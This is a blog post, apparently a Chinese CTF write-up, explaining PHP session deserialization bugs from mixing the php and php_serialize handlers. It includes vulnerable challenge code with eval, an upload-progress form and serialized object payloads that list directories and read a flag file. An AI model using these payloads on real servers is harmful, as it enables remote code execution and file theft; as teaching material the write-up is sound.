@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>php反序列化漏洞——Session | DD&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"DDstick","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/dd.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">DD</h5>
+          <a href="mailto:674135019@qq.com" title="674135019@qq.com" class="mail">
+            
+              <span>6</span>
+            
+              <span>7</span>
+            
+              <span>4</span>
+            
+              <span>1</span>
+            
+              <span>3</span>
+            
+              <span>5</span>
+            
+              <span>0</span>
+            
+              <span>1</span>
+            
+              <span>9</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/DDstick" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/custom"  >
+                <i class="icon icon-lg icon-plus-square"></i>
+                CUSTOM
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>php反序列化漏洞——Session</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">php反序列化漏洞——Session</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-01-29T04:58:14.000Z" itemprop="datePublished" class="page-time">
+  2020-01-29
+</time>
+
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-php反序列化漏洞——Session"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">php反序列化漏洞——Session</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-01-29 12:58:14" datetime="2020-01-29T04:58:14.000Z"  itemprop="datePublished">2020-01-29</time>
+
+            
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <p>php存储session有三种模式，php_serialize, php, binary</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 </span><br><span class="line"></span><br><span class="line">php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line"></span><br><span class="line">php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure>
+
+<p>其中php_serialize和php的不合理使用会导致安全问题的发生</p>
+<p>关于session的存储，java是将用户的session存入内存中，而php则是将session以文件的形式存储在服务器某个tmp文件中，可以在php.ini里面设置session.save_path存储的位置</p>
+<a rel=php反序列化漏洞——Session href="/2020/01/29/php反序列化漏洞——Session/1.png" title="" data-fancybox="images"><img src="/2020/01/29/php反序列化漏洞——Session/1.png"></a>
+
+<p>设置序列化规则则是</p>
+<a rel=php反序列化漏洞——Session href="/2020/01/29/php反序列化漏洞——Session/2.png" title="" data-fancybox="images"><img src="/2020/01/29/php反序列化漏洞——Session/2.png"></a>
+
+<p>注意，php_serialize在5.5版本后新加的一种规则，5.4及之前版本，如果设置成php_serialize会报错</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler = php          　　  一直都在            它是用 |分割</span><br><span class="line">session.serialize_handler = php_serialize 　　 5.5之后启用         它是用serialize反序列化格式分割</span><br></pre></td></tr></table></figure>
+
+<p>首先看 <strong>session.serialize_handler = php</strong> 序列化的结果</p>
+<a rel=php反序列化漏洞——Session href="/2020/01/29/php反序列化漏洞——Session/3.png" title="" data-fancybox="images"><img src="/2020/01/29/php反序列化漏洞——Session/3.png"></a>
+
+<p>它的规则是$_SESSION是个数组，数组中的键和值中间用 | 来分割，值如果是数组或对象按照序列化的格式存储</p>
+<p><strong>session.serialize_handler = php_serialize</strong>的序列化结果为</p>
+<a rel=php反序列化漏洞——Session href="/2020/01/29/php反序列化漏洞——Session/4.png" title="" data-fancybox="images"><img src="/2020/01/29/php反序列化漏洞——Session/4.png"></a>
+
+<p>它是全程按照serialize的格式序列化了$_SESSION这个数组</p>
+<p>它比php的格式多了个最前面多了个 “a:2:{ ….” 也就是$_SESSION这个数组有2个元素，还有个区别在于，它的键名也表明了长度和属性，中间用 ; 来隔开键值对</p>
+<p>虽然2个序列化格式本身没有问题，但是如果2个混合起用就会造成危害</p>
+<p><strong>形成原理是在用 session.serialize_handler = php_serialize 存储的字符可以引入 | ，再用 session.serialize_handler = php 格式取出$_SESSION的值时“|”会被当成键值对的分隔符</strong></p>
+<p>即，当先用php存了数组，在$_SESSION[‘a’]的值中加入 | ，并在之后写成一个数组的序列化格式</p>
+<a rel=php反序列化漏洞——Session href="/2020/01/29/php反序列化漏洞——Session/5.png" title="" data-fancybox="images"><img src="/2020/01/29/php反序列化漏洞——Session/5.png"></a>
+
+<p>如果正常的用php_serialize解析，它返回的是$_SESSION[‘a’]是个长度为50的字符串</p>
+<a rel=php反序列化漏洞——Session href="/2020/01/29/php反序列化漏洞——Session/6.png" title="" data-fancybox="images"><img src="/2020/01/29/php反序列化漏洞——Session/6.png"></a>
+
+<p>如果用php进行解析，发现它理解为一个很长的名字的值是一个带了2个元素的数组</p>
+<a rel=php反序列化漏洞——Session href="/2020/01/29/php反序列化漏洞——Session/7.png" title="" data-fancybox="images"><img src="/2020/01/29/php反序列化漏洞——Session/7.png"></a>
+
+<a rel=php反序列化漏洞——Session href="/2020/01/29/php反序列化漏洞——Session/8.png" title="" data-fancybox="images"><img src="/2020/01/29/php反序列化漏洞——Session/8.png"></a>
+
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>题目链接：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p>
+<p>题目源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由源码可知，能够查看phpinfo</p>
+<a rel=php反序列化漏洞——Session href="/2020/01/29/php反序列化漏洞——Session/9.png" title="" data-fancybox="images"><img src="/2020/01/29/php反序列化漏洞——Session/9.png"></a>
+
+<p>除此之外，看到construct()和_destruct()两个魔术方法，很有可能是反序列化。并且，destruct()中有 eval($this -&gt; mdzz)</p>
+<p>如果 $this -&gt; mdzz 可控的话，那就明显是个webshell了，但这里不知如何利用</p>
+<p>再看到备注的 <strong>ini_set(‘session.serialize_handler’,’php’)</strong> 又从phpinfo中可看到</p>
+<a rel=php反序列化漏洞——Session href="/2020/01/29/php反序列化漏洞——Session/10.png" title="" data-fancybox="images"><img src="/2020/01/29/php反序列化漏洞——Session/10.png"></a>
+
+<p>在php.ini中默认的session.serialize_handler为php_serialize，而index.php中将其设置为了php，这就导致了session的反序列化问题</p>
+<p>这个漏洞如果要触发，则需要在服务器中写入一个使用php_serialize序列话的值，然后访问时就会被php的引擎反序列化</p>
+<p>学习大佬的笔记，利用了 <strong>上传进度支持（Upload progress in sessions）</strong> 的知识点来向服务器设置session。具体为，在上传文件时，如果POST一个名为PHP_SESSION_UPLOAD_PROGRESS的变量，就可以将filename的值赋值到session中，上传的页面的写法如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<a rel=php反序列化漏洞——Session href="/2020/01/29/php反序列化漏洞——Session/12.png" title="" data-fancybox="images"><img src="/2020/01/29/php反序列化漏洞——Session/12.png"></a>
+
+<p>任意上传文件后，在访问文件名时，触发反序列化漏洞，我们需要控制名字。实际上我们可以看到，我们最终需要的是class类中的一个$mdzz变量，在序列化中保存的信息会采用class的信息保存，不仅有mdzz变量，所以复制一个同样的class和变量然后来序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz=<span class="string">'print_r(dirname(__FILE__));'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> OowoO();</span><br><span class="line">$a = serialize($obj);</span><br><span class="line"> </span><br><span class="line">var_dump($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>为防止转义，在引号前加上\。在前面加上一个|，这是session的格式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\<span class="string">"OowoO\":1:&#123;s:4:\"mdzz\";s:27:\"print_r(dirname(__FILE__));\";&#125;</span></span><br></pre></td></tr></table></figure>
+
+<a rel=php反序列化漏洞——Session href="/2020/01/29/php反序列化漏洞——Session/13.png" title="" data-fancybox="images"><img src="/2020/01/29/php反序列化漏洞——Session/13.png"></a>
+
+<p>同理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\<span class="string">"OowoO\":1:&#123;s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";&#125;</span></span><br></pre></td></tr></table></figure>
+
+<a rel=php反序列化漏洞——Session href="/2020/01/29/php反序列化漏洞——Session/14.png" title="" data-fancybox="images"><img src="/2020/01/29/php反序列化漏洞——Session/14.png"></a>
+
+<p>那么只需利用file_get_contents()即可得到文件内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\<span class="string">"OowoO\":1:&#123;s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";&#125;</span></span><br></pre></td></tr></table></figure>
+
+<a rel=php反序列化漏洞——Session href="/2020/01/29/php反序列化漏洞——Session/15.png" title="" data-fancybox="images"><img src="/2020/01/29/php反序列化漏洞——Session/15.png"></a>
+
+<!-- 利用此方法可达到对session写入数据的效果，从而使得 $mdzz 可控。
+
+当一个上传在处理中，同时 post 一个与 ini 设置的 session.uploadprogress.name 同名变量时，php 检测到这种 post 请求时就会在 $SESSION 中添加一组数据，所以可通过 session.upload_progress 来设置 session。 -->
+
+
+<p>查看该题的phpinfo，session.upload_progress.enabled 打开，session.upload_progress.cleanup 关闭</p>
+<a rel=php反序列化漏洞——Session href="/2020/01/29/php反序列化漏洞——Session/10.png" title="" data-fancybox="images"><img src="/2020/01/29/php反序列化漏洞——Session/10.png"></a>
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2020-01-31T11:02:57.517Z" itemprop="dateUpdated">2020-01-31 19:02:57</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2020/01/29/php反序列化漏洞——Session/" target="_blank" rel="external">https://ddstick.github.io/2020/01/29/php反序列化漏洞——Session/</a>
+        
+    </div>
+    <footer>
+        <a href="https://ddstick.github.io">
+            <img src="/img/dd.jpg" alt="DD">
+            DD
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://ddstick.github.io/2020/01/29/php反序列化漏洞——Session/&title=《php反序列化漏洞——Session》 — DD's Blog&pic=https://ddstick.github.io/img/dd.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://ddstick.github.io/2020/01/29/php反序列化漏洞——Session/&title=《php反序列化漏洞——Session》 — DD's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2020/01/21/php反序列化漏洞——unserialize/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">php反序列化漏洞——unserialize</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#例题"><span class="post-toc-number">1.</span> <span class="post-toc-text">例题</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.lujingtao.com" target="_blank">HOME</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                DD &copy; 2017 - 2020
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://ddstick.github.io/2020/01/29/php反序列化漏洞——Session/&title=《php反序列化漏洞——Session》 — DD's Blog&pic=https://ddstick.github.io/img/dd.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://ddstick.github.io/2020/01/29/php反序列化漏洞——Session/&title=《php反序列化漏洞——Session》 — DD's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACtklEQVR42u3aQW7DQAgF0Nz/0u22Umv3A4MbVc+rKLId3ixmCPB6xdfH7fX1nu9P3b8huf/q/ccuPDw8vLXQ74O7CisJN3kqieeHqPDw8PDWeFeB3m/699Tq0iSkPGY8PDy89+Hlm36yKPkxg4eHh/efeHlNIPncK3zg4eHhPc+bvC4BVwscvaIwHh4e3jO8s9v6M59X+nt4eHh446560nxKSg95e2wS2w/R4uHh4S3w8g23mrD20t9eWv9LnHh4eHhHedVBqPug8wJEXp5IChOXi4uHh4e3wOu150+VNqqjBs2DCg8PD+8oLykNVEev5u2xwlhAfiTg4eHhHeLloVSLCHnimyxBvpTNagoeHh5ekZcfDL2f7CXQ1cbbZcx4eHh4j/PyQJMfmwwiNJNyPDw8vKO83gGQDArk2/3ZgYPX/HzDw8PDC3iT5v3knnzgoLdYeHh4eHu8ZCOuFgh6Awr5oRK14vDw8PAe5OV//vMd+NReXRhNwMPDw3uQl7MnjGr7rZzW4+Hh4S3w8q0/Ly4kJdeNoavy8YaHh4c34CWNpfx1ebh5G6w3xICHh4f3DK+3TU+Gq/LGWHN8AQ8PD2+NN09newNbebjloSs8PDy8NV7vFfNia5KIj0YH8PDw8B7kVRPovB1VBUzegIeHh7fHywcIqlt2PhAwKVIcG73Cw8PDK/I2fqDaQusNH5STaTw8PLw1Xg9WbY/lx0lS9o0mI/Dw8PAGvI/i1WuSTYq2k0IzHh4e3gav2shPHs5hG0NaTSQeHh5ekVdtz/eGBhJYb2l+iQQPDw9vjZe3rJI0N/++l8TnCT0eHh7eO/DyzTop2h5rdN03wPDw8PD+lDdp//eKufmRE50beHh4eId485JBXqSYzESVRw3w8PDwFnjVP/xJgpts3JMBhQM9PTw8PLwO7xNg8ZKXuy4y5gAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+</body>
+</html>
